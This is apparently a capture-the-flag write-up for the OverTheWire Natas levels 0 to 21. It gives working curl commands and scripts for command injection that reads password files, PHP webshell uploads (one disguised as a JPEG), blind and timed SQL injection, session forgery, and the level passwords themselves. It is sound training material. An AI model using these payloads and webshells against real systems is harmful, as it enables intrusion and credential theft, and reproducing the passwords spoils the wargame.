# Natas

## Info

Levels: `http://natas{LEVEL}.natas.labs.overthewire.org`
Source: `http://natas{LEVEL}.natas.labs.overthewire.org/index-source.html`
Passwords: `/etc/natas_webpass/natas{LEVEL}`
## Natas 0 -- Basic Auth

```powershell
➜ curl http://natas0.natas.labs.overthewire.org -u 'natas0:natas0' -s | sls password

You can find the password for the next level on this page.
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```
## Natas 1 -- HTML Comment

```powershell
➜ curl http://natas1.natas.labs.overthewire.org -u 'natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq'
...
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
...
```
## Natas 2 -- Files Disclosure

```powershell
➜ curl http://natas2.natas.labs.overthewire.org -u 'natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI'
...
There is nothing on this page
<img src="files/pixel.png">
...
```

![Natas.png](/assets/ctf/overthewire/natas.png)

```powershell
➜ curl http://natas2.natas.labs.overthewire.org/files/users.txt -u 'natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI'
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
## Natas 3 -- robots

```powershell
➜ curl http://natas3.natas.labs.overthewire.org -u 'natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'
...
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
...
➜ curl http://natas3.natas.labs.overthewire.org/robots.txt -u 'natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'
User-agent: *
Disallow: /s3cr3t/
➜ curl http://natas3.natas.labs.overthewire.org/s3cr3t/ -u 'natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'
...
	<title>Index of /s3cr3t</title>
...
<a href="users.txt">users.txt</a>
...
➜ curl http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt -u 'natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
## Natas 4 -- Referer

```powershell
➜ curl http://natas4.natas.labs.overthewire.org -u 'natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'
...
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
...
➜ curl http://natas4.natas.labs.overthewire.org -u 'natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ' -H 'Referer: http://natas5.natas.labs.overthewire.org/'
...
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
...
```
## Natas 5 -- Edit Cookie

```powershell
➜ curl http://natas5.natas.labs.overthewire.org -u 'natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK' -i
HTTP/1.1 200 OK
Set-Cookie: loggedin=0
...
Access disallowed. You are not logged in
...
➜ curl http://natas5.natas.labs.overthewire.org -u 'natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK' -b 'loggedin=1'
...
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
...
```
## Natas 6 -- Information Disclosure

![Natas-1.png](/assets/ctf/overthewire/natas-1.png)

```php
<?
include "includes/secret.inc";

if (array_key_exists("submit", $_POST)) {
    if ($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```

```powershell
➜ curl 'http://natas6.natas.labs.overthewire.org/includes/secret.inc' -u 'natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned'
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
➜ curl http://natas6.natas.labs.overthewire.org -u 'natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned' -d 'submit=1&secret=FOEIUWGHFEEUHOFUOIU'
...
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
...
```
## Natas 7 -- LFI

[http://natas7.natas.labs.overthewire.org/index.php?page=home](http://natas7.natas.labs.overthewire.org/index.php?page=home)
[http://natas7.natas.labs.overthewire.org/index.php?page=about](http://natas7.natas.labs.overthewire.org/index.php?page=about)

```powershell
➜ curl 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/hostname' -u 'natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'
...
natas

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
...
➜ curl 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' -u 'natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'
...
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
...
```
## Natas 8 -- Encode Reverse

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
	    print "Access granted. The password for natas9 is <censored>";
    } else {
	    print "Wrong secret";
    }
}
?>
```

```bash
<?php
echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
# oubWYf2kBq
```

```powershell
➜ curl http://natas8.natas.labs.overthewire.org -u 'natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q' -d 'submit=1&secret=oubWYf2kBq'
...
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
...
```
## Natas 9 -- Command Injection

![Natas-2.png](/assets/ctf/overthewire/natas-2.png)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

```powershell
➜ curl http://natas9.natas.labs.overthewire.org -u 'natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t' -d 'needle=1;id;'
...
<pre>
uid=30009(natas9) gid=30009(natas9) groups=30009(natas9)
</pre>
...
➜ curl http://natas9.natas.labs.overthewire.org -u 'natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t' -d 'needle=1;cat /etc/natas_webpass/natas10;'
...
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
...
```
## Natas 10 -- Command Injection (2)

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

```powershell
➜ curl 'http://natas10.natas.labs.overthewire.org/' -u 'natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu' -d "needle='' /etc/natas_webpass/natas11 #"
...
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
...
```

## Natas 11 -- Crib
 
![Natas-3.png](/assets/ctf/overthewire/natas-3.png)

```php
<?

$defaultdata = array("showpassword" => "no", "bgcolor" => "#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if (array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if (is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if (array_key_exists("bgcolor", $_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>

<?
if ($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```

[Known-plaintext attack tool for XOR-encrypted data](https://alamot.github.io/xor_kpa/)

```bash
└─$ echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg' | base64 -d > encrpyted.txt
└─$ py2 /opt/scripts/attack/xorknown.py encrpyted.txt 'showpassword'
Searching XOR-encrypted encrpyted.txt for string 'showpassword' (max_key_length = 20)
...
Key length: 12
Partial Key: eDWoeDWoeDWo
Plaintext: {"showpassword":"no","bgcolor":"#ffffff"}
...
```

![Natas-4.png](/assets/ctf/overthewire/natas-4.png)

```powershell
➜ curl 'http://natas11.natas.labs.overthewire.org/?bgcolor=%23ffffff' -u 'natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk' -b 'data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'
...
The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
...
```

---

Somewhat later I realized that we already know the plaintext, so you can take the original cookie where bgcolor is `#FFFFFF`, then use `{"showpassword":` or smaller json to do XOR and leak the key. As you can see `eDWo` keeps repeating meaning it's the key.

![Natas-30.png](/assets/ctf/overthewire/natas-30.png)

---

## Natas 12 -- Upload webshell

![Natas-5.png](/assets/ctf/overthewire/natas-5.png)

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters) - 1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do { $path = $dir . "/" . genRandomString() . "." . $ext; } 
    while (file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if (array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
    ...
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
    ...
<?php } ?>
```

```powershell
➜ echo '<?PHP echo system($_REQUEST[0]); ?>' > t.php
➜ curl 'http://natas12.natas.labs.overthewire.org/' -u 'natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB' -F 'uploadedfile=@t.php' -F 'filename=letmein.php'
...
The file <a href="upload/nkt0ik000f.php">upload/nkt0ik000f.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a>
...
➜ curl 'http://natas12.natas.labs.overthewire.org/upload/nkt0ik000f.php?0=id' -u 'natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'
uid=30012(natas12) gid=30012(natas12) groups=30012(natas12),50001(phpupload)
➜ curl 'http://natas12.natas.labs.overthewire.org/upload/nkt0ik000f.php?0=cat+/etc/natas_webpass/natas13' -u 'natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
## Natas 13 -- Upload image webshell

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters) - 1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do { $path = $dir . "/" . genRandomString() . "." . $ext; } 
    while (file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if (array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err = $_FILES["uploadedfile"]["error"];
    if ($err) {
        if ($err === 2) { echo "The uploaded file exceeds MAX_FILE_SIZE"; } 
        else { echo "Something went wrong :/"; }
    } elseif (filesize($_FILES["uploadedfile"]["tmp_name"]) > 1000) {
        echo "File is too big";
    } elseif (!exif_imagetype($_FILES["uploadedfile"]["tmp_name"])) {
        echo "File is not an image";
    } else {
        if (move_uploaded_file($_FILES["uploadedfile"]["tmp_name"], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
} else { ?>
	<form enctype="multipart/form-data" action="index.php" method="POST">
		<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
		<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
		Choose a JPEG to upload (max 1KB):<br/>
		<input name="uploadedfile" type="file" /><br />
		<input type="submit" value="Upload File" />
	</form>
<?php } ?>
```

```bash
└─$ head ~/Pictures/usb.jpg -c 100 > usb.jpg.php
└─$ echo '<?php echo system($_REQUEST[0]);?>' >> usb.jpg.php
└─$ file usb.jpg.php
usb.jpg.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16

└─$ curl 'http://natas13.natas.labs.overthewire.org/' -u 'natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC' -F 'uploadedfile=@usb.jpg.php' -F 'filename=letmein.php'
...
The file <a href="upload/qj9pp6qp2e.php">upload/qj9pp6qp2e.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
...
└─$ curl 'http://natas13.natas.labs.overthewire.org/upload/qj9pp6qp2e.php?0=id' -u 'natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC' -so- | strings
JFIF
ICC_PROFILE
mntrRGB XYZ
acsp
uid=30013(natas13) gid=30013(natas13) groups=30013(natas13),50001(phpupload)
uid=30013(natas13) gid=30013(natas13) groups=30013(natas13),50001(phpupload)
└─$ curl 'http://natas13.natas.labs.overthewire.org/upload/qj9pp6qp2e.php?0=cat+/etc/natas_webpass/natas14' -u 'natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC' -so- | strings
JFIF
ICC_PROFILE
mntrRGB XYZ
acsp
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
## Natas 14 -- SQLi (Basic)

![Natas-6.png](/assets/ctf/overthewire/natas-6.png)

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

```powershell
➜ curl 'http://natas14.natas.labs.overthewire.org/?debug=1' -u 'natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ' -d 'username=1\" OR 1=1 -- -&password=2'
...
Executing query: SELECT * from users where username="1" OR 1=1 -- -" and password="2"
<br>Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
...
```
## Natas 15 -- SQLi (Blind)

![Natas-7.png](/assets/ctf/overthewire/natas-7.png)

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) { echo "Executing query: $query<br>";}

    $res = mysqli_query($link, $query);
    if($res) {
	    if(mysqli_num_rows($res) > 0) { echo "This user exists.<br>"; } 
	    else { echo "This user doesn't exist.<br>"; }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
}
```

```python
import string
import asyncio
from aiohttp import ClientSession, BasicAuth

URL = 'http://natas15.natas.labs.overthewire.org/'
CHARSET = string.ascii_letters + string.digits + '{}!?/_.'
PAYLOAD = 'natas16" AND BINARY SUBSTR(password,{},1)="{}"-- -'
SUCCESS = 'This user exists.'

async def fetch(session, index, char):
    async with session.post(URL, data={'username': PAYLOAD.format(index, char)}) as resp:
        if SUCCESS in await resp.text():
            return char

        return None

async def main():
    auth = BasicAuth(login='natas15', password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
    password = '' # 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
    async with ClientSession(auth=auth) as session:
        while True:
            password_i = len(password)
            print(f'\r[{password_i}] {password}', end='')
            tasks = [fetch(session, password_i + 1, char) for char in CHARSET]
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    password += result
                    break
            else:
                break

        print(f'\r[{password_i}] {password}')

if __name__ == '__main__':
    asyncio.run(main())
```

> **Note**: For some reason `SUBSTR` function was not case sensitive?... `BINARY` made it case sensitive again.

## Natas 16 -- Command Injection (Blind) 

![Natas-8.png](/assets/ctf/overthewire/natas-8.png)

```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if (preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```

```python
import string
import requests
import requests.auth

URL = 'http://natas16.natas.labs.overthewire.org/'
CHARSET = string.ascii_letters + string.digits
FAILURE = 'ambidextrous'
PAYLOAD = '$(grep ^{} /etc/natas_webpass/natas17)' + FAILURE

auth = requests.auth.HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
password = '' # EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
with requests.Session() as session:
    while True:
        for char in CHARSET:
            password_i = len(password)
            resp = session.post(URL, data={'needle': PAYLOAD.format(password + char)}, auth=auth)
            print(f'\r[{password_i}] {password}{char}', end='')
            if FAILURE not in resp.text:
                password += char
                break
        else:
            break
    
    print(f'\r[{password_i}] {password} | {char}')
```
## Natas 17 -- SQLi (Timed) 

![Natas-9.png](/assets/ctf/overthewire/natas-9.png)

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
	    if(mysqli_num_rows($res) > 0) {
	        // echo "This user exists.<br>";
	    } else {
	        // echo "This user doesn't exist.<br>";
	    }
    } else {
        // echo "Error in query.<br>";
    }

    mysqli_close($link);
} 
?>
```

```python
import string
import requests
from requests.auth import HTTPBasicAuth

URL = 'http://natas17.natas.labs.overthewire.org/'
CHARSET = string.ascii_letters + string.digits
AUTH = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
DELAY = 3
PAYLOAD = 'natas18" AND IF(BINARY SUBSTR(password,{},1)="{}",SLEEP({}),false)-- -'

password = '' # 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
with requests.Session() as session:
    session.auth = AUTH
    while True:
        for char in CHARSET:
            password_i = len(password)
            resp = session.post(URL, data={'username': PAYLOAD.format(password_i + 1, char, DELAY)})
            print(f'\r[{password_i}] {password}{char}', end='')
            if resp.elapsed.total_seconds() > DELAY:
                password += char
                break
        else:
            break
    
    print(f'\r[{password_i}] {password} | {char}')
```

> **Note**: For some reason `SUBSTR` function was not case sensitive?... `BINARY` made it case sensitive again.

## Natas 18 -- Predictable Session ID

![Natas-10.png](/assets/ctf/overthewire/natas-10.png)

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if ($_REQUEST["username"] == "admin") {
        /* This method of authentication appears to be unsafe and has been disabled for now. */
        // return 1;
    }
    return 0;
}

function isValidID($id) { return is_numeric($id); }
function createID($user) { global $maxid; return rand(1, $maxid); }
function debug($msg) { if (array_key_exists("debug", $_GET)) { print "DEBUG: $msg<br>"; } }

function my_session_start() {
    if (array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if (!session_start()) {
            debug("Session start failed");
            return false;
        } else {
            debug("Session start ok");
            if (!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }
            return true;
        }
    }
    return false;
}

function print_credentials() {
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if (my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
        session_id(createID($_REQUEST["username"]));
        session_start();
        $_SESSION["admin"] = isValidAdminLogin();
        debug("New session started");
        $showform = false;
        print_credentials();
    }
}
```

```python
import requests
from requests.auth import HTTPBasicAuth

URL = 'http://natas18.natas.labs.overthewire.org/?username=letmein'
AUTH = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
SUCCESS = 'Password'

with requests.Session() as session:
    session.auth = AUTH
    for i in range(641):
        resp = session.get(URL, cookies={"PHPSESSID": str(i)})
        print(f'\r[{i}] Cookie', end='')
        if SUCCESS in resp.text:
            print(f'\r[{i}] Cookie', end='')
            print('\r\n' + resp.text)
            break

# [119] Cookie
# Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```
## Natas 19 -- Predictable Session ID (2)

![Natas-11.png](/assets/ctf/overthewire/natas-11.png)

```php
<?php 
...
function myhex2bin($h) { 
  if (!is_string($h)) return null;
  $r='';
  for ($a=0; $a<strlen($h); $a+=2) { $r.=chr(hexdec($h[$a].$h[($a+1)])); }
  return $r;
}
...
function isValidID($id) { 
    // must be lowercase
    if($id != strtolower($id)) { return false; }

    // must decode
    $decoded = myhex2bin($id);

    // must contain a number and a username
    if(preg_match('/^(?P<id>\d+)-(?P<name>\w+)$/', $decoded, $matches)) {
        return true;
    }

    return false;
}

function createID($user) { 
    global $maxid;
    $idnum = rand(1, $maxid);
    $idstr = "$idnum-$user";
    return bin2hex($idstr);
}
```

```python
import requests
from requests.auth import HTTPBasicAuth

URL = 'http://natas19.natas.labs.overthewire.org/?username=letmein'
AUTH = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
SUCCESS = 'You are an admin'

with requests.Session() as session:
    session.auth = AUTH
    for i in range(641):
        resp = session.post(
            URL, 
            data={'username': 'letmein', 'password': 'please'},
            cookies={"PHPSESSID": f'{i}-admin'.encode().hex()}
        )
        print(f'\r[{i}] Cookie', end='')
        if SUCCESS in resp.text:
            print(f'\r[{i}] Cookie', end='')
            print('\r\n' + resp.text)
            break

# [281] Cookie
# Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```
## Natas 20 -- Custom SESSID Logic Vulnerability

![Natas-12.png](/assets/ctf/overthewire/natas-12.png)

```php
<?php
...
function myread($sid) {
    debug("MYREAD $sid");
    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
        debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if (!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from " . $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach (explode("\n", $data) as $line) {
        debug("Read [$line]");
        $parts = explode(" ", $line, 2);
        if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
        debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in " . $filename);
    ksort($_SESSION);
    foreach ($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}
...
session_set_save_handler(
    "myopen",
    "myclose",
    "myread", // https://www.php.net/manual/en/function.session-set-save-handler.php#read
    "mywrite", // https://www.php.net/manual/en/function.session-set-save-handler.php#write
    "mydestroy",
    "mygarbage"
);
session_start();

if (array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if (array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}
```

myread code introduces vulnerability by changing the logic, especially when it assigns the key:value pairs to session from data, which is taken from username.
```php
foreach (explode("\n", $data) as $line) {
	debug("Read [$line]");
	$parts = explode(" ", $line, 2);
	if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
```

No sanitization allows us to inject newline and then `admin 1` which is used to check if we are admin and get password.

```powershell
└─$ curl 'http://natas20.natas.labs.overthewire.org/index.php?debug' -u 'natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw' -d 'name=x%0Aadmin 1' -s | grep DEBUG
DEBUG: MYREAD qmeuoqnabcgh8jeugij9956qls<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to x
DEBUG: MYWRITE qmeuoqnabcgh8jeugij9956qls name|s:9:"x
admin 1";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_qmeuoqnabcgh8jeugij9956qls<br>DEBUG: name => x

└─$ curl 'http://natas20.natas.labs.overthewire.org/index.php?debug' -u 'natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw' -b 'PHPSESSID=qmeuoqnabcgh8jeugij9956qls'
...
DEBUG: MYREAD qmeuoqnabcgh8jeugij9956qls<br>DEBUG: Reading from /var/lib/php/sessions/mysess_qmeuoqnabcgh8jeugij9956qls<br>DEBUG: Read [name x]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>
...
```
## Natas 21 -- Cross Domain Cookie

![Natas-13.png](/assets/ctf/overthewire/natas-13.png)

```php
<?php

function print_credentials() { /* {{{ */
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas22\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

[http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org)

![Natas-14.png](/assets/ctf/overthewire/natas-14.png)

```php
<?php
session_start();

// if update was submitted, store it
if (array_key_exists("submit", $_REQUEST)) {
    foreach ($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}

if (array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach ($validkeys as $key => $defval) {
    $val = $defval;
    if (array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
    } else {
        $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: " . $_SESSION["bgcolor"] . "; text-align: " . $_SESSION["align"] . "; font-size: " . $_SESSION["fontsize"] . ";";
$example = "<div style='$style'>Hello world!</div>";
?>
```

```bash
└─$ curl 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug' -u 'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH' -d 'submit=1&admin=1' -i
HTTP/1.1 200 OK
...
Set-Cookie: PHPSESSID=4ajo0ql65lip3qqg6qoh2eoi5l; path=/; HttpOnly
...
[DEBUG] Session contents:<br>Array
(
    [debug] =>
    [submit] => 1
    [admin] => 1
)
...
└─$ curl 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug' -u 'natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH' -d 'submit=1&admin=1' -b 'PHPSESSID=4ajo0ql65lip3qqg6qoh2eoi5l' -i
...
[DEBUG] Session contents:<br>Array
(
    [debug] =>
    [submit] => 1
    [admin] => 1
    [align] => center
    [fontsize] => 100%
    [bgcolor] => yellow
)
...
